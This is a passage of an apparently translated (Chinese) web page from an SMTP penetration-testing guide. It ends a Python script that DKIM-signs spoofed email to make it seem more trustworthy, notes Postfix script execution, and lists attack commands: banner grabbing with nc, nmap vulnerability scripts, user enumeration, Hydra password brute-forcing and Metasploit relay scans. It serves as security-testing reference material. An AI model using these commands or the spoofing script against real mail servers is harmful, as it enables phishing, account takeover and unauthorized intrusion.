+headers = [b&quot;To&quot;, b&quot;From&quot;, b&quot;Subject&quot;]
+msg_data = msg.as_bytes()
+
+# 使用dkim签署电子邮件
+## 收件人将无法检查，但电子邮件将显示为已签名（因此更可信）
+dkim_selector=&quot;s1&quot;
+sig = dkim.sign(message=msg_data,selector=str(dkim_selector).encode(),domain=sender_domain.encode(),privkey=dkim_private_key.encode(),include_headers=headers)
+msg[&quot;DKIM-Signature&quot;] = sig[len(&quot;DKIM-Signature: &quot;) :].decode()
+msg_data = msg.as_bytes()
+
+# 使用本地后缀中继发送电子邮件
+smtp=&quot;127.0.0.1&quot;
+s = smtplib.SMTP(smtp)
+s.sendmail(sender, [destination], msg_data)
+</code></pre>
+<h3 id="_16">更多信息</h3>
+<p><strong>在</strong> <a href="https://seanthegeek.net/459/demystifying-dmarc/"><strong>https://seanthegeek.net/459/demystifying-dmarc/</strong></a>  <strong>中查找有关这些保护的更多信息</strong></p>
+<h2 id="smtp">通过 SMTP 渗透</h2>
+<p><strong>如果您可以通过 SMTP 发送数据，</strong> [<strong>请阅读此</strong>]<strong>。</strong></p>
+<h2 id="_17">配置文件</h2>
+<h3 id="_18">后缀</h3>
+<p>通常，如果已安装，in<code>/etc/postfix/master.cf</code>包含在例如用户收到新邮件时<strong>执行的脚本。</strong>例如，该行<code>flags=Rq user=mark argv=/etc/postfix/filtering-f ${sender} -- ${recipient}</code>表示<code>/etc/postfix/filtering</code>如果用户标记收到新邮件，将执行该行。</p>
+<p>其他配置文件：</p>
+<pre><code>sendmail.cf
+submit.cf
+</code></pre>
+<h2 id="_19">自动化命令</h2>
+<pre><code class="language-bash">Protocol_Name: SMTP    #协议缩写(如果有的话)。
+Port_Number:  25,465,587     #如果有多个，则用逗号分隔。
+Protocol_Description: Simple Mail Transfer Protocol          #协议缩写
+
+Entry_1:
+  Name: Notes
+  Description: Notes for SMTP
+  Note: |
+    SMTP (Simple Mail Transfer Protocol) is a TCP/IP protocol used in sending and receiving e-mail. However, since it is limited in its ability to queue messages at the receiving end, it is usually used with one of two other protocols, POP3 or IMAP, that let the user save messages in a server mailbox and download them periodically from the server.
+
+
+Entry_2:
+  Name: Banner Grab
+  Description: Grab SMTP Banner
+  Command: nc -vn {IP} 25
+
+Entry_3:
+  Name: SMTP Vuln Scan
+  Description: SMTP Vuln Scan With Nmap
+  Command: nmap --script=smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 {IP}
+
+Entry_4:
+  Name: SMTP User Enum
+  Description: Enumerate uses with smtp-user-enum
+  Command: smtp-user-enum -M VRFY -U {Big_Userlist} -t {IP}
+
+Entry_5:
+  Name: SMTPS Connect
+  Description: Attempt to connect to SMTPS two different ways
+  Command: openssl s_client -crlf -connect {IP}:465 &amp;&amp;&amp;&amp; openssl s_client -starttls smtp -crlf -connect {IP}:587
+
+Entry_6:
+  Name: Find MX Servers
+  Description: Find MX servers of an organization
+  Command: dig +short mx {Domain_Name}
+
+Entry_7:
+  Name: Hydra Brute Force
+  Description: Need Nothing
+  Command: hydra -P {Big_Passwordlist} {IP} smtp -V
+
+Entry_8:
+  Name: consolesless mfs enumeration
+  Description: SMTP enumeration without the need to run msfconsole
+  Note: sourced from https://github.com/carlospolop/legion
+  Command: msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_version; set RHOSTS {IP}; set RPORT 25; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_ntlm_domain; set RHOSTS {IP}; set RPORT 25; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smtp/smtp_relay; set RHOSTS {IP}; set RPORT 25; run; exit' 
+
+</code></pre>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../43%20-%20%20WHOIS%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        43 - WHOIS渗透测试
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../23%20-%20Telnet%20%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" class="btn btn-xs btn-link">
+        23 - Telnet 渗透测试
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content">
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by None (noraj).</p>
+</footer>
+
+</body>
+</html>
